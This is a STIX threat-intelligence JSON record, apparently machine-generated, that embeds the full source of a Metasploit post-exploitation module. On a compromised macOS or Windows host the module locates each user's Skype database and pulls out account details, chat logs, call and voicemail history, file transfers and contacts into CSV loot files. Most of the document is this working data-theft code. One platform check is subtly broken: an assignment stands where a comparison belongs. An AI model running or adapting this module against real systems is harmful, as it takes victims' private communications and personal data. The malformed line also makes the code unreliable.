{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4607d65d-7605-45b9-8d22-dbc0cdabdc61",
    "created": "2024-08-14T16:33:19.178049Z",
    "modified": "2024-08-14T16:33:19.178052Z",
    "name": "Multi Gather Skype User Data Enumeration",
    "description": " This module will enumerate Skype account settings, contact list, call history, chat logs file transfer history, and voicemail logs, saving all the data to CSV files for analysis.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/skype_enum.rb",
            "external_id": "skype_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'csv'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::OSX::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Skype User Data Enumeration',\n        'Description' => %q{\n          This module will enumerate Skype account settings, contact list, call history, chat logs,\n          file transfer history, and voicemail logs, saving all the data to CSV files for analysis.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => %w[osx win],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              stdapi_fs_search\n              stdapi_fs_separator\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n    register_advanced_options(\n      [\n        # Set as an advanced option since it can only be useful in shell sessions.\n        OptInt.new('TIMEOUT', [true, 'Timeout in seconds when downloading main.db on a shell session.', 90]),\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    # syinfo is only on meterpreter sessions\n    print_status(\"Running Skype enumeration against #{sysinfo['Computer']}\") if !sysinfo.nil?\n\n    # Ensure that SQLite3 gem is installed\n    begin\n      require 'sqlite3'\n    rescue LoadError\n      print_error(\"Failed to load sqlite3, try 'gem install sqlite3'\")\n      return\n    end\n\n    if session.platform =~ /java/\n      # Make sure that Java Meterpreter on anything but OSX will exit\n      if session.platform !~ /osx/\n        print_error('This session type and platform are not supported.')\n        return\n      end\n      # Iterate thru each user profile on as OSX System for users not in the default install\n      users = get_users.collect { |p| p['uid'].to_i > 500 ? p : nil }.compact\n      users.each do |p|\n        next unless check_skype(\"#{p['dir']}/Library/Application Support/\", p['name'])\n\n        db_in_loot = download_db(p)\n        # Exit if file was not successfully downloaded\n        return if db_in_loot.nil?\n\n        process_db(db_in_loot, p['name'])\n      end\n    elsif (((session.platform = - 'windows')) && (session.type == 'meterpreter'))\n      # Iterate thru each user profile in a Windows System using Meterpreter Post API\n      grab_user_profiles.each do |p|\n        if check_skype(p['AppData'], p['UserName'])\n          db_in_loot = download_db(p)\n          process_db(db_in_loot, p['UserName'])\n        end\n      end\n    else\n      print_error('This session type and platform are not supported.')\n    end\n  end\n\n  # Check if Skype is installed. Returns true or false.\n  def check_skype(path, user)\n    dirs = []\n    if session.type == 'meterpreter'\n      session.fs.dir.foreach(path) do |d|\n        dirs << d\n      end\n    else\n      dirs = cmd_exec(\"ls -m \\\"#{path}\\\"\").split(', ')\n    end\n    dirs.each do |dir|\n      if dir =~ /Skype/\n        print_good(\"Skype account found for #{user}\")\n        return true\n      end\n    end\n    print_error(\"Skype is not installed for #{user}\")\n    return false\n  end\n\n  # Download file using Meterpreter functionality and returns path in loot for the file\n  def download_db(profile)\n    if session.type == 'meterpreter'\n      if session.platform == 'osx'\n        file = session.fs.file.search(\"#{profile['dir']}/Library/Application Support/Skype/\", 'main.db', true)\n      else\n        file = session.fs.file.search(\"#{profile['AppData']}\\\\Skype\", 'main.db', true)\n      end\n    else\n      file = cmd_exec('mdfind', \"-onlyin #{profile['dir']} -name main.db\").split(\"\\n\").collect { |p| p =~ %r{Skype/\\w*/main.db$} ? p : nil }.compact\n    end\n\n    file_loc = store_loot('skype.config',\n                          'binary/db',\n                          session,\n                          'main.db',\n                          \"Skype Configuration database for #{profile['UserName']}\")\n\n    file.each do |db|\n      if session.type == 'meterpreter'\n        maindb = \"#{db['path']}#{session.fs.file.separator}#{db['name']}\"\n        print_status(\"Downloading #{maindb}\")\n        session.fs.file.download_file(file_loc, maindb)\n      else\n        print_status(\"Downloading #{db}\")\n        # Giving it 1:30 minutes to download since the file could be several MB\n        maindb = cmd_exec('cat', \"\\\"#{db}\\\"\", datastore['TIMEOUT'])\n        if maindb.nil?\n          print_error('Could not download the file. Set the TIMEOUT option to a higher number.')\n          return\n        end\n        # Saving the content as binary so it can be used\n        output = ::File.open(file_loc, 'wb')\n        maindb.each_line do |d|\n          output.puts(d)\n        end\n        output.close\n      end\n      print_good(\"Configuration database saved to #{file_loc}\")\n    end\n    return file_loc\n  end\n\n  # Saves rows returned from a query to a given CSV file\n  def save_csv(data, file)\n    CSV.open(file, 'w') do |csvwriter|\n      data.each do |record|\n        csvwriter << record\n      end\n    end\n  end\n\n  # Extracts the data from the DB in to a CSV file\n  def process_db(db_path, user)\n    db = SQLite3::Database.new(db_path)\n\n    # Extract information for accounts configured in Skype\n    print_status('Enumerating accounts')\n    user_rows = db.execute2('SELECT \"skypeout_balance_currency\", \"skypeout_balance\", \"skypeout_precision\",\n          \"skypein_numbers\", \"subscriptions\", \"offline_callforward\", \"service_provider_info\",\n          datetime(\"timestamp\",\"unixepoch\")\"registration_timestamp\",\n          \"nr_of_other_instances\", \"partner_channel_status\", \"flamingo_xmpp_status\",\n          \"owner_under_legal_age\", \"type\", \"skypename\", \"pstnnumber\", \"fullname\",\n          \"birthday\", \"gender\", \"languages\", \"country\", \"province\", \"city\", \"phone_home\",\n          \"phone_office\", \"phone_mobile\", \"emails\", \"homepage\", \"about\",\n          datetime(\"profile_timestamp\",\"unixepoch\"), \"received_authrequest\",\n          \"displayname\", \"refreshing\", \"given_authlevel\", \"aliases\", \"authreq_timestamp\",\n          \"mood_text\", \"timezone\", \"nrof_authed_buddies\", \"ipcountry\",\n          \"given_displayname\", \"availability\", datetime(\"lastonline_timestamp\",\"unixepoch\"),\n          \"assigned_speeddial\", datetime(\"lastused_timestamp\",\"unixepoch\"),\n          \"assigned_comment\", \"alertstring\", datetime(\"avatar_timestamp\",\"unixepoch\"),\n          datetime(\"mood_timestamp\",\"unixepoch\"), \"rich_mood_text\", \"synced_email\",\n          \"verified_email\", \"verified_company\" FROM Accounts;')\n\n    # Check if an account exists and if it does enumerate if not exit.\n    if user_rows.length > 1\n      user_info = store_loot('skype.accounts',\n                             'text/plain',\n                             session,\n                             '',\n                             'skype_accounts.csv',\n                             \"Skype User #{user} Account information from configuration database.\")\n      print_good(\"Saving account information to #{user_info}\")\n      save_csv(user_rows, user_info)\n    else\n      print_error(\"No skype accounts are configured for #{user}\")\n      return\n    end\n\n    # Extract chat log from the database\n    print_status('Extracting chat message log')\n    cl_rows = db.execute2('SELECT \"chatname\", \"convo_id\", \"author\", \"dialog_partner\",\n          datetime(\"timestamp\",\"unixepoch\"), \"body_xml\",\n          \"remote_id\" FROM \"Messages\" WHERE type == 61;')\n    chat_log = store_loot('skype.chat',\n                          'text/plain',\n                          session,\n                          '',\n                          'skype_chatlog.csv',\n                          \"Skype User #{user} chat log from configuration database.\")\n\n    if cl_rows.length > 1\n      print_good(\"Saving chat log to #{chat_log}\")\n      save_csv(cl_rows, chat_log)\n    else\n      print_error('No chat logs where found!')\n    end\n\n    # Extract file transfer history\n    print_status('Extracting file transfer history')\n    ft_rows = db.execute2('SELECT \"partner_handle\", \"partner_dispname\",\n          datetime(\"starttime\",\"unixepoch\"), datetime(\"finishtime\",\"unixepoch\"),\n          \"filepath\", \"filename\", \"filesize\", \"bytestransferred\",\n          \"convo_id\", datetime(\"accepttime\",\"unixepoch\") FROM \"Transfers\";')\n\n    file_transfer = store_loot('skype.filetransfer',\n                               'text/csv',\n                               session,\n                               '',\n                               'skype_filetransfer.csv',\n                               \"Skype User #{user} file transfer history.\")\n    # Check that we have actual file transfers to report\n    if ft_rows.length > 1\n      print_good(\"Saving file transfer history to #{file_transfer}\")\n      save_csv(ft_rows, file_transfer)\n    else\n      print_error('No file transfer history was found!')\n    end\n\n    # Extract voicemail history\n    print_status('Extracting voicemail history')\n    vm_rows = db.execute2('SELECT \"type\", \"partner_handle\", \"partner_dispname\", \"status\",\n          \"subject\", datetime(\"timestamp\",\"unixepoch\"), \"duration\", \"allowed_duration\",\n          \"playback_progress\", \"convo_id\", \"chatmsg_guid\", \"notification_id\", \"flags\",\n          \"size\", \"path\", \"xmsg\" FROM \"Voicemails\";')\n\n    voicemail = store_loot('skype.voicemail',\n                           'text/csv',\n                           session,\n                           '',\n                           'skype_voicemail.csv',\n                           \"Skype User #{user} voicemail history.\")\n\n    if vm_rows.length > 1\n      print_good(\"Saving voicemail history to #{voicemail}\")\n      save_csv(vm_rows, voicemail)\n    else\n      print_error('No voicemail history was found!')\n    end\n\n    # Extracting call log\n    print_status('Extracting call log')\n    call_rows = db.execute2('SELECT datetime(\"begin_timestamp\",\"unixepoch\"),\n          \"topic\",\"host_identity\", \"mike_status\", \"duration\", \"soundlevel\", \"name\",\n          \"is_incoming\", \"is_conference\", \"is_on_hold\",\n          datetime(\"start_timestamp\",\"unixepoch\"), \"quality_problems\", \"current_video_audience\",\n          \"premium_video_sponsor_list\", \"conv_dbid\" FROM \"Calls\";')\n\n    call_log = store_loot('skype.callhistory',\n                          'text/csv',\n                          session,\n                          '',\n                          'skype_callhistory.csv',\n                          \"Skype User #{user} call history.\")\n    if call_rows.length > 1\n      print_good(\"Saving call log to #{call_log}\")\n      save_csv(call_rows, call_log)\n    else\n      print_error('No call log was found!')\n    end\n\n    # Extracting contact list\n    print_status('Extracting contact list')\n    ct_rows = db.execute2('SELECT  \"skypename\", \"pstnnumber\", \"aliases\", \"fullname\",\n          \"birthday\", \"languages\", \"country\", \"province\", \"city\", \"phone_home\",\n          \"phone_office\", \"phone_mobile\", \"emails\", \"homepage\", \"about\", \"mood_text\",\n          \"ipcountry\", datetime(\"lastonline_timestamp\",\"unixepoch\"), \"displayname\",\n          \"given_displayname\", \"assigned_speeddial\", \"assigned_comment\",\"assigned_phone1\",\n          \"assigned_phone1_label\", \"assigned_phone2\", \"assigned_phone2_label\",\n          \"assigned_phone3\", \"assigned_phone3_label\", \"popularity_ord\", \"isblocked\",\n          \"main_phone\", \"phone_home_normalized\", \"phone_office_normalized\",\n          \"phone_mobile_normalized\", \"verified_email\", \"verified_company\"\n          FROM \"Contacts\";')\n\n    contact_log = store_loot('skype.contactlist',\n                             'text/csv',\n                             session,\n                             '',\n                             'skype_contactlist.csv',\n                             \"Skype User #{user} contact list.\")\n    if ct_rows.length > 1\n      print_good(\"Saving contact list to #{contact_log}\")\n      save_csv(ct_rows, contact_log)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[osx win]"
    ]
}